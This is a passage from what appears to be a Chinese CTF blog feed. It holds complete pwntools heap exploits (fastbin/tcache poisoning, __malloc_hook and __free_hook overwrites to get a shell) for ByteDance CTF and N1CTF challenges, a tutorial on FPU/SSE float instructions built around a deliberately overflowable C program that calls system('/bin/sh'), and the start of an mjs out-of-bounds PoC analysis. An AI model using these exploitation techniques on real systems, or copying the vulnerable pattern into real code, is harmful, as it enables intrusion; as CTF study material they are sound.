a.sendlineafter(<span class="string">"&gt;"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    menu(<span class="string">'S'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    menu(<span class="string">'E'</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"index&gt;"</span>,str(idx))</span><br><span class="line">    a.sendafter(<span class="string">"&gt;"</span>,content)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'A'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'A'</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">a.recvuntil(<span class="string">"[0]:\n"</span>)</span><br><span class="line">libc_base=u64(a.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x10</span><span class="number">-88</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'A\n'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A\n'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A\n'</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">__malloc_hook=libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">add(<span class="number">0x68</span>,p64(__malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A'</span>*<span class="number">0x13</span>+p64(libc_base+<span class="number">0x4526a</span>))</span><br><span class="line">menu(<span class="string">'C'</span>)</span><br><span class="line">a.sendlineafter(<span class="string">"size&gt;"</span>,str(<span class="number">10</span>))</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><h3 id="N1CTF"><a href="#N1CTF" class="headerlink" title="N1CTF"></a>N1CTF</h3><h4 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h4><p>因为ptr指针的原因，可以造成UAF…</p><p>劫持stdout泄露地址即可.</p><p>完整exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">exec_file=<span class="string">"./warmup"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">"47.52.90.3"</span>,<span class="string">"9999"</span>)</span><br><span class="line">    libc=ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *($text_base+0x000000000000C71)</span></span><br><span class="line"><span class="string">    b *($text_base+0x000000000000D66)</span></span><br><span class="line"><span class="string">    b *($text_base+0x000000000000E27)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"&gt;&gt;"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.sendafter(<span class="string">"content&gt;&gt;"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"x:"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"ex:"</span>,str(idx))</span><br><span class="line">    a.sendafter(<span class="string">"&gt;&gt;"</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'A'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">'A'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">'A'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">'A'</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'A'</span>)<span class="comment"># ptr = 0</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\xb0'</span>)</span><br><span class="line">add(<span class="string">'A'</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'A'</span>)<span class="comment"># ptr = chunk_1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'\x60\x27'</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\xc0'</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="string">'A'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">'A'</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)<span class="comment">#7</span></span><br><span class="line">a.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">a.recvuntil(<span class="string">"\x7f"</span>)</span><br><span class="line">libc_base=u64(a.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-131</span>-libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">__free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'A'</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(__free_hook<span class="number">-8</span>))</span><br><span class="line">add(<span class="string">'A'</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span>+p64(system_addr))<span class="comment">#9</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;周末两场比赛的一些题解.&lt;/p&gt;
&lt;h3 id=&quot;字节跳动CTF&quot;&gt;&lt;a href=&quot;#字节跳动CTF&quot; class=&quot;headerlink&quot; title=&quot;字节跳动CTF&quot;&gt;&lt;/a&gt;字节跳动CTF&lt;/h3&gt;&lt;h4 id=&quot;mheap&quot;&gt;&lt;a href=&quot;#mheap&quot; c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>浮点运算指令</title>
    <link href="http://yoursite.com/2019/09/05/%E6%B5%AE%E7%82%B9%E8%BF%90%E7%AE%97%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2019/09/05/浮点运算指令/</id>
    <published>2019-09-05T11:32:45.000Z</published>
    <updated>2019-09-05T12:34:54.006Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>出某道招新题因为对浮点寄存器及其指令不了解导致自己也不会做了，同时复现qwb的restaurant也遇到了浮点数就补了补习…<br>参考了以下文章:<br><a href="https://blog.csdn.net/fuxiaoxiaoyue/article/details/82663827" target="_blank" rel="noopener">SSE学习笔记</a><br><a href="https://blog.csdn.net/q_l_s/article/details/54909328" target="_blank" rel="noopener">汇编语言学习笔记(十二)-浮点指令</a><br><a href="https://www.iteye.com/blog/aisxyz-2440913" target="_blank" rel="noopener">浮点寄存器概述</a><br>《深入理解计算机系统》</p><p>图片我也是直接截图了…</p><p>反汇编发现32位和64使用的浮点数指令不相同，64位使用SSE指令，32位使用FPU进行浮点运算</p><h3 id="FPU"><a href="#FPU" class="headerlink" title="FPU"></a>FPU</h3><blockquote><p>FPU：(Float Point Unit，浮点运算单元)FPU是专用于浮点运算的处理器，以前的FPU是一种单独芯片，在486之后，英特尔把FPU集成在CPU之内。</p></blockquote><h4 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令:"></a>常用指令:</h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">fld:</span> 将数据压入寄存器堆栈</span><br><span class="line"><span class="symbol">fst:</span> 将数据从寄存器堆栈弹出</span><br><span class="line"><span class="symbol">fstp:</span> 取栈顶的值，但是不弹出</span><br></pre></td></tr></table></figure><p>指令的最前面f表示FPU，ld表示load，st表示store</p><p>FPU有8个独立寻址的80位寄存器 st0 - st7 ，他们形成寄存器堆栈.<strong>新放入的浮点数先存放在st0中，原本st0中的浮点数放入到st1中</strong>，以此类推。</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试:"></a>测试:</h4><p>实验代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%f"</span>,&amp;a);</span><br><span class="line">    <span class="keyword">if</span> (a==<span class="number">3.15</span>)&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x80484eb</span> &lt;main+<span class="number">48</span>&gt;    <span class="keyword">fld</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">0x10</span>]</span><br></pre></td></tr></table></figure><p>执行这条指令之前st0寄存器为:<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="symbol">$</span>st0</span><br><span class="line"><span class="meta"><span class="meta-keyword">$1</span> = 0</span></span><br></pre></td></tr></table></figure></p><p>执行后:<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="symbol">$</span>st0</span><br><span class="line"><span class="meta"><span class="meta-keyword">$2</span> = 1</span></span><br></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x80484ee</span> &lt;main+<span class="number">51</span>&gt;    <span class="keyword">fld</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x80485d0</span>]</span><br></pre></td></tr></table></figure><p>执行这条指令后,st1寄存器变为1，st0寄存器变为3.15:<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="symbol">$</span>st0</span><br><span class="line"><span class="meta"><span class="meta-keyword">$3</span> = 3.1499999999999999111821580299874768</span></span><br><span class="line">pwndbg&gt; p <span class="symbol">$</span>st1</span><br><span class="line"><span class="meta"><span class="meta-keyword">$4</span> = 1</span></span><br></pre></td></tr></table></figure></p><h3 id="SSE指令"><a href="#SSE指令" class="headerlink" title="SSE指令"></a>SSE指令</h3><p>SSE有八个个128位计算器，xmm0 - xmm7。 每个128位的寄存器，可以存放四个32位的单精度浮点数。<br><img src="/2019/09/05/浮点运算指令/1.png" alt=""><a href="https://blog.csdn.net/fuxiaoxiaoyue/article/details/82663827" target="_blank" rel="noopener">图源</a></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p $xmm0</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  v4_float = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, </span><br><span class="line">  v2_double = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, </span><br><span class="line">  v16_int8 = &#123;<span class="number">0</span> &lt;repeats <span class="number">16</span> times&gt;&#125;, </span><br><span class="line">  v8_int16 = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, </span><br><span class="line">  v4_int32 = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, </span><br><span class="line">  v2_int64 = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, </span><br><span class="line">  uint128 = <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SSE的浮点运算指令有两个类型：packed 和 scalar。<br>packed指令是一次对xmm寄存器中的四个浮点数均进行计算，而scalar类型的则会根据指令的最后一位来对xmm寄存器中的低位进行计算。如下图所示：<br><img src="/2019/09/05/浮点运算指令/2.png" alt=""><a href="https://blog.csdn.net/fuxiaoxiaoyue/article/details/82663827" target="_blank" rel="noopener">图源</a></p><h4 id="SSE指令的构成："><a href="#SSE指令的构成：" class="headerlink" title="SSE指令的构成："></a>SSE指令的构成：</h4><p>第一部分表示指令的作用，比如加法add,mov,com等；<br>中间的即是上面说到的两种类型:p或者s，分别表示为packed或者scalar；<br>第三部分为s或者d，s(single)表示单精度浮点数, d(double)表示双精度浮点数</p><p>例如指令movss value , xmm0 ，是将value这个单精度浮点数放入xmm0寄存器低位的第一个浮点数槽中.</p><h4 id="常用的指令"><a href="#常用的指令" class="headerlink" title="常用的指令:"></a>常用的指令:</h4><p>值转移指令:<br><img src="/2019/09/05/浮点运算指令/3.png" alt=""></p><p>浮点数和整形之间的转换:</p><p><img src="/2019/09/05/浮点运算指令/4.png" alt=""></p><p>比较指令:</p><p><img src="/2019/09/05/浮点运算指令/5.png" alt=""></p><h3 id="遇到的问题…"><a href="#遇到的问题…" class="headerlink" title="遇到的问题…"></a>遇到的问题…</h3><p>原本出的题的源码如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a;</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">10</span>];</span><br><span class="line">    read(<span class="number">0</span>,b,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (a==<span class="number">3.15</span>)&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想通过溢出改变a的值，然后执行system(“/bin/sh”)，但是实际操作时，将a覆盖为3.15对应的float底层表示，但是仍然不能比较通过.<br>原因是 3.15因为float精度不够，编译器将他编译成double类型的3.15<br>对应的汇编代码如下:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">0x804845f</span> &lt;main+<span class="number">36</span>&gt;    <span class="keyword">fld</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x8048462</span> &lt;main+<span class="number">39</span>&gt;    <span class="keyword">fld</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x8048528</span>]</span><br><span class="line">   <span class="number">0x8048468</span> &lt;main+<span class="number">45</span>&gt;    <span class="keyword">fucomip</span> <span class="built_in">st</span>(<span class="number">1</span>)</span><br><span class="line">   <span class="number">0x804846a</span> &lt;main+<span class="number">47</span>&gt;    <span class="keyword">jp</span>     main+<span class="number">79</span> &lt;<span class="number">0x804848a</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x804846c</span> &lt;main+<span class="number">49</span>&gt;    <span class="keyword">fld</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="number">0x8048528</span>]</span><br><span class="line">   <span class="number">0x8048472</span> &lt;main+<span class="number">55</span>&gt;    <span class="keyword">fucomip</span> <span class="built_in">st</span>(<span class="number">1</span>)</span><br><span class="line">   <span class="number">0x8048474</span> &lt;main+<span class="number">57</span>&gt;    <span class="keyword">fstp</span>   <span class="built_in">st</span>(<span class="number">0</span>)</span><br><span class="line">   <span class="number">0x8048476</span> &lt;main+<span class="number">59</span>&gt;    <span class="keyword">jne</span>    main+<span class="number">81</span> &lt;<span class="number">0x804848c</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="symbol">.rodata:</span><span class="number">08048528</span> byte_8048528    <span class="built_in">db</span> <span class="number">33h</span>                  <span class="comment">; DATA XREF: main+27↑r</span></span><br><span class="line"><span class="symbol">.rodata:</span><span class="number">08048528</span>                                         <span class="comment">; main+31↑r</span></span><br><span class="line"><span class="symbol">.rodata:</span><span class="number">08048529</span>                 <span class="built_in">db</span>  <span class="number">33h</span> <span class="comment">; 3</span></span><br><span class="line"><span class="symbol">.rodata:</span>0804852A                 <span class="built_in">db</span>  <span class="number">33h</span> <span class="comment">; 3</span></span><br><span class="line"><span class="symbol">.rodata:</span>0804852B                 <span class="built_in">db</span>  <span class="number">33h</span> <span class="comment">; 3</span></span><br><span class="line"><span class="symbol">.rodata:</span>0804852C                 <span class="built_in">db</span>  <span class="number">33h</span> <span class="comment">; 3</span></span><br><span class="line"><span class="symbol">.rodata:</span><span class="number">0804852D</span>                 <span class="built_in">db</span>  <span class="number">33h</span> <span class="comment">; 3</span></span><br><span class="line"><span class="symbol">.rodata:</span>0804852E                 <span class="built_in">db</span>    <span class="number">9</span></span><br><span class="line"><span class="symbol">.rodata:</span>0804852F                 <span class="built_in">db</span>  <span class="number">40h</span> <span class="comment">; @</span></span><br></pre></td></tr></table></figure><p>将32位的float和64位的double比较肯定不会通过比较…</p><p>解决办法是强制类型转化下:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a;</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">10</span>];</span><br><span class="line">    read(<span class="number">0</span>,b,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (a==(<span class="keyword">float</span>)<span class="number">3.15</span>)&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;出某道招新题因为对浮点寄存器及其指令不了解导致自己也不会做了，同时复现qwb的restaurant也遇到了浮点数就补了补习…&lt;br&gt;参考了以
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>QWB2019-babyjs</title>
    <link href="http://yoursite.com/2019/09/03/QWB2019-babyjs/"/>
    <id>http://yoursite.com/2019/09/03/QWB2019-babyjs/</id>
    <published>2019-09-03T01:22:48.000Z</published>
    <updated>2019-09-03T11:53:55.125Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前看过的一道题，因为想知道js解释器的工作原理，就读了读源码，后来看了v8，这道题就太监了 …</p><p>参考了: <a href="https://xz.aliyun.com/t/5279" target="_blank" rel="noopener">强网杯babyjs</a></p><h3 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h3><p><a href="https://github.com/cesanta/mjs/issues/114" target="_blank" rel="noopener">issue：AddressSanitizer: invalid READ at mjs.c:9644</a></p><p>参考文章中给出了github上的poc:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> s ;</span><br><span class="line"><span class="keyword">let</span> o = (s);</span><br><span class="line"><span class="keyword">let</span> z = <span class="built_in">JSON</span>.parse[<span class="number">333333333</span>%<span class="number">3333333333</span>] === <span class="string">'xx'</span></span><br></pre></td></tr></table></figure><p>运行poc可以发现在<code>getprop_builtin_foreign</code>中存在越界访问:<br><img src="/2019/09/03/QWB2019-babyjs/1.png" alt=""><br>其中RSI为输入的index，就是333333333%3333333333 , RAX为基地址。</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="mjs对象的构成"><a href="#mjs对象的构成" class="headerlink" title="mjs对象的构成:"></a>mjs对象的构成:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mjs_property</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mjs_property</span> *<span class="title">next</span>;</span> <span class="comment">/* Linkage in struct mjs_object::properties */</span></span><br><span class="line">  <span class="keyword">mjs_val_t</span> name;            <span class="comment">/* Property name (a string) */</span></span><br><span class="line">  <span class="keyword">mjs_val_t</span> value;           <span class="comment">/* Property value */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mjs_object</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mjs_property</span> *<span class="title">properties</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>属性通过链表串起来，属性中保存的有name和value，name及为属性的名称，value即为该属性所对应的值</p><h4 id="mjs如何区分各类对象"><a href="#mjs如何区分各类对象" class="headerlink" title="mjs如何区分各类对象:"></a>mjs如何区分各类对象:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A tag is made of the sign bit and the 4 lower order bits of byte 6.</span></span><br><span class="line"><span class="comment"> * So in total we have 32 possible tags.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Tag (1,0) however cannot 